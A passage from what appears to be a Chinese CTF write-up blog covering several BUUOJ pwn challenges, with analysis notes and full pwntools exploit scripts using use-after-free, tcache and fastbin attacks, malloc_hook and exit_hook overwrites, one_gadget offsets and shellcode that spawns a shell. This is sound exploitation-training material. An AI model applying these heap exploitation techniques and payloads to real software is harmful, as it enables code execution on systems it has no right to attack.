是一个无符号类型的数据。</strong></p><p>当用uaf漏洞，在一个chain上伪造一个chunk地址，这样当申请后tcache bin的count会变成0xff&gt;0x7，这样利用uaf，再次释放这个chain上 的chunk，就会进入到unsortbin，接着就leak 出libc了。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk<span class="hljs-number">0x55daa2e85000</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x250</span>                Used                None              None<span class="hljs-number">0x55daa2e85250</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x7fb70dbbaca0</span>    <span class="hljs-number">0x7fb70dbbaca0</span><span class="hljs-number">0x55daa2e85360</span>      <span class="hljs-number">0x110</span>               <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x55daa2e85370</span>              Nonepwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x55daa2e85000</span><span class="hljs-number">0x55daa2e85000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000251</span><span class="hljs-number">0x55daa2e85010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0xff00000000000000</span><span class="hljs-number">0x55daa2e85020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>剩下的就是进行tcache dup即可。这个比我那个方法要简单的多。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/github_36788573/article/details/103475238" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103475238</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/103450524" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/103450524</a></p><h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a><code>护网杯_2018_gettingstart</code></h2><p>白给题。考浮点数在内存中是怎么存的。</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-string">'1'</span> * <span class="hljs-number">24</span> + p64(<span class="hljs-number">0x7fffffffffffffff</span>) + p64(<span class="hljs-number">0x3FB999999999999A</span>)s(data)itr()</code></pre></div><h2 id="OGeek2019-bookmanager"><a href="#OGeek2019-bookmanager" class="headerlink" title="[OGeek2019]bookmanager"></a><code>[OGeek2019]bookmanager</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><ul><li>存在heap overflow</li><li>uaf</li><li>off by one</li></ul><p>一堆洞，伪代码看起来很复杂，但是利用起来较为简单。</p><p>重点漏洞函数在 updata上。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn-2'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29005</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_section</span><span class="hljs-params">(chapter,name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sa(<span class="hljs-string">'into'</span>,str(chapter))    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_text</span><span class="hljs-params">(section,size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sa(<span class="hljs-string">'into'</span>,str(section))    sla(<span class="hljs-string">'write'</span>,str(size))    sa(<span class="hljs-string">'Text'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_section</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'5'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_text</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'7'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(type,name,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'8'</span>)    sla(<span class="hljs-string">'update'</span>,str(type))    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'New'</span>,str(data))sla(<span class="hljs-string">'Name'</span>,<span class="hljs-string">'chumen77'</span> * <span class="hljs-number">4</span>)add_chapter(<span class="hljs-string">'chumen77'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'1'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'2'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'3'</span>)add_text(<span class="hljs-string">'1'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)<span class="hljs-comment"># show()</span>add_text(<span class="hljs-string">'2'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'2'</span>*<span class="hljs-number">0x100</span>)del_section(<span class="hljs-string">'1'</span>)del_section(<span class="hljs-string">'2'</span>)show()ru(<span class="hljs-string">'Section:'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_baseadd_text(<span class="hljs-string">'3'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)edit(<span class="hljs-string">'Section'</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'3'</span> + <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'1'</span>*(<span class="hljs-number">0x20</span><span class="hljs-number">-2</span>) + <span class="hljs-string">'\xd0'</span>)data = p64(free_hook) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,data)one = libc_base + rce16[<span class="hljs-number">2</span>]edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,p64(one))del_chapter(<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="题记-2"><a href="#题记-2" class="headerlink" title="题记"></a>题记</h3><ul><li><p>题是简单题，但是由于代码一多，且指针看起来复杂，个人做起来就有点慢，并且让自己连最简单的heap overflow都没有想起来去利用。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4></li><li><p>对于指针复杂的堆信息分配，可以直接gdb上手调来确定基本堆信息。</p></li></ul><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a><code>de1ctf_2019_weapon</code></h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><ul><li>uaf</li><li>最大只能申请0x60的chunk</li><li>没有show函数</li><li>部分input利用scanf来获取读入</li></ul><h3 id="攻击思路-5"><a href="#攻击思路-5" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>free 2个chunk，然后用scanf 读入大量的字符，来获取一个smallbin</li><li>利用残留的libc地址，fastbin attck <code>IO_stdout</code>来泄漏libc</li><li>fastbin attck <code>malloc_hook</code></li></ul><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./de1ctf_2019_weapon'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size of weapon:'</span>,str(size))    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'new'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x1000</span>)    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p16(<span class="hljs-number">0xa5dd</span>))    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">2</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span>)    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    <span class="hljs-comment"># debug()</span>    data = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,data)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./de1ctf_2019_weapon')</span>        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)malloc_hook = <span class="hljs-number">0x3c4b10</span> + libc_addrfree(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">0</span>,p64(malloc_hook - <span class="hljs-number">0x13</span>))add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)one = rce16[<span class="hljs-number">3</span>] + libc_addrdata = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">3</span> + p64(one)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,data)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size of weapon:'</span>,<span class="hljs-string">'10'</span>)sla(<span class="hljs-string">'dex'</span>,<span class="hljs-string">'9'</span>)<span class="hljs-comment"># add(9,0x30,'1')</span><span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><code>starctf_2019_babyshell</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>会有一个函数检查你的shellcode是否满足要求。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = a1; *i; ++i ) &#123;   <span class="hljs-keyword">for</span> ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j )     ;   <span class="hljs-keyword">if</span> ( !*j )                                  <span class="hljs-comment">// 检查shellcode合法的函数，遍历shellcode的每个字符，在0x400987处找是否有匹配。</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L; &#125; <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;</code></pre></div><p>需要0x400987地址处的字节码匹配。倘若发现有不匹配的字节，就直接check不过。</p><p>可以用的有 <code>pop rdx、pop rdi、syscall</code></p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>有师傅的做法，就是用这3个汇编，强行凑出一个read，然后把shellcode再次读到mmap的buf上合适的位置（此题加12），再次调用到shellcode。</p><p><a href="https://www.cnblogs.com/Rookle/p/12895895.html" target="_blank" rel="noopener">https://www.cnblogs.com/Rookle/p/12895895.html</a><br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/105863820" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105863820</a></p><div class="hljs"><pre><code class="hljs undefined">对于一些受限的shellcode，我们最好的办法是构造<span class="hljs-built_in">read</span>系统调用。</code></pre></div><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有就是这个循环，其实直接可以用<code>\x00</code>截断，因为开头循环条件2 给0 直接就不执行下面的检测循环，return 1 走了。</p><p><strong>但是跳过去需要，提前再布置几个机器码字节保证不影响下面的shellcode。</strong></p><p>可以直接在ida里面设置显示机器码，以后直接选取合适的机器码整上去就可以了。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">00 </span><span class="hljs-number">5</span>A <span class="hljs-number">5</span>A                    add     [rdx+<span class="hljs-number">5</span>Ah], bl</code></pre></div><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())s(<span class="hljs-string">'\x00'</span>+ <span class="hljs-string">'\x5a'</span> +<span class="hljs-string">'\x00'</span>+ shellcode)</code></pre></div><h3 id="题记-3"><a href="#题记-3" class="headerlink" title="题记"></a>题记</h3><p>感觉个人shellcode能力较差，得抽时间学习下。</p><h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a><code>hfctf_2020_marksman</code></h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>上来给了libc地址，可以任意地址3个字节的写入。</p><h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>修改那里的地址，才能控制程序流程。</p><p>可以修改<code>exit_hook</code>:<br><a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a><br>参考这里。</p><p>在退出时：</p><p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p><p>修改<code>__rtld_lock_unlock_recursive</code>或者<code>__rtld_lock_lock_recursive</code>即可。</p><p><strong>gdb 快速获取这个地址的办法：</strong></p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p &amp;<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_rtld_lock_recursive</span></code></pre></div><h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>one gadget的调整。</p><p>其中 <code>one_gadget -lx</code>  这个可以设置扫描等级获取更多的one gadget。</p><p>并且在程序中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_BC2</span><span class="hljs-params">(_BYTE *a1)</span></span>&#123;  <span class="hljs-keyword">if</span> ( (*a1 != <span class="hljs-number">0xC5</span>u || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF2</span>u) &amp;&amp; (*a1 != <span class="hljs-number">0x22</span> || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF3</span>u) &amp;&amp; *a1 != <span class="hljs-number">0x8C</span>u &amp;&amp; a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xA3</span>u )    <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You always want a Gold Finger!"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>对写入的地址也给限制了不能出现这几个字节。<br>其中就让很好的:</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x10a38c</span> execve(<span class="hljs-string">"/bin/sh"</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>, environ)<span class="hljs-symbol">constraints:</span>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>] == NULL</code></pre></div><p>不让写入使用了。其他的因为地址小，爆破差距大，或者限制条件高，不适合使用。</p><p>想办法调整一下，来实现上面这个one gadget的使用。</p><p><a href="http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90" target="_blank" rel="noopener">http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90</a></p><p>参考 taqini师傅的这个文章，发现其中就有对这个的分析，发现最重要的就是：<br><code>rsi rdi rdx</code>要给控制好，其中这个gadget附近的汇编如图所示</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uQchWa.png" srcset="/img/loading.gif" alt></p><p>其中8c结尾的汇编之后是一定要执行的，其中就控制了<code>rsi rdi rdx</code>。并且8c这条汇编也是不可以跳过，控制的rax，在这个one gadget 中是很有用的，否则当初作者在写这个one gadget怎么没有跳过，直接从93结尾汇编开始了。</p><p>向上看有个call指令，这是对接下来的one gadget执行并无造成重要参数大的影响的，所以可以尝试向上写一个地址，让这个gadget从<code>0x10a387</code>开始。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/hDqu69.png" srcset="/img/loading.gif" alt><br>执行下去发现是可以满足<code>execve(&quot;/bin/sh&quot;, 0, environ)</code>的。</p><p>此题中对于exit hook 的改写中，<code>_dl_rtld_lock_recursive</code> 可以完成条件的满足。<code>_dl_rtld_unlock_recursive</code>不可以。<br>具体跟过去会发现是在第2和参数出了问题，且在one gadget中第二个参数的控制很玄学，且很难控制，让人头大。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)exit_hook = <span class="hljs-number">0x81df60</span> + libc_baseone = <span class="hljs-number">0x10a387</span> + libc_base<span class="hljs-comment"># debug()</span>sl(str(exit_hook))sla(<span class="hljs-string">'biang'</span>,chr((one  &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">8</span> &amp;<span class="hljs-number">0xff</span>)))sla(<span class="hljs-string">'biang!'</span>,chr((one &gt;&gt; <span class="hljs-number">16</span> &amp;<span class="hljs-number">0xff</span>)))itr()</code></pre></div><h3 id="题记-4"><a href="#题记-4" class="headerlink" title="题记"></a>题记</h3><p>对于修改<code>_dl_fini</code>，又发现了一个很好的参考链接：<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p><h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><ul><li>开头mmap 一段内存 rwx</li><li>libc 2.27的off by null</li><li>没有show</li></ul><h3 id="攻击思路-6"><a href="#攻击思路-6" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>先上来申请一个0x1000的内存块，然后释放，可以保证每次申请的堆块上都存有libc信息，准备攻击利用</li><li>off by null 留出 2个重叠的堆块</li><li>一个攻击 mmap，另一个攻击malloc hook</li></ul><p>由于tcache 基本没有什么检查，利用起来较为容易。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_easy_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28382</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span 